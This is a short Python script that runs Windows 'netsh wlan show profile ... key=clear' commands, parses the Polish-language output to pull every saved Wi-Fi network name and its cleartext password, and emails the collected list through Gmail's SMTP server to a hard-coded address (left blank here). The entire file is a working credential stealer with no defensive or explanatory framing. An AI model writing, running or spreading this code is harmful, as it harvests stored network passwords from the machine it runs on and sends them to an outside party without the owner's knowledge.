import subprocess
import smtplib
import re


def send_mail(email, password, message):
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.starttls()
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()


def get_wifis():
	command = "netsh wlan show profile"
	result = subprocess.check_output(command, shell=True)
	result = result.decode('unicode_escape').encode('utf-8').decode('utf-8')
	pattern = re.compile(r'Profil wszystkich .*: ([0-9a-zA-Z-_]*)', re.IGNORECASE)
	return re.findall(pattern, result)

wifi_list = get_wifis()
message = ''
pattern = re.compile(r'.* klucza .*: (.*)\r\n', re.IGNORECASE)
for wifi in wifi_list:
	command = f"netsh wlan show profile {wifi} key=clear"
	result = subprocess.check_output(command, shell=True)
	result = result.decode('unicode_escape').encode('utf-8').decode('utf-8')
	password = re.findall(pattern, result)
	message += f'Password for {wifi} -> {password[0]} \n'
send_mail('', '', message)
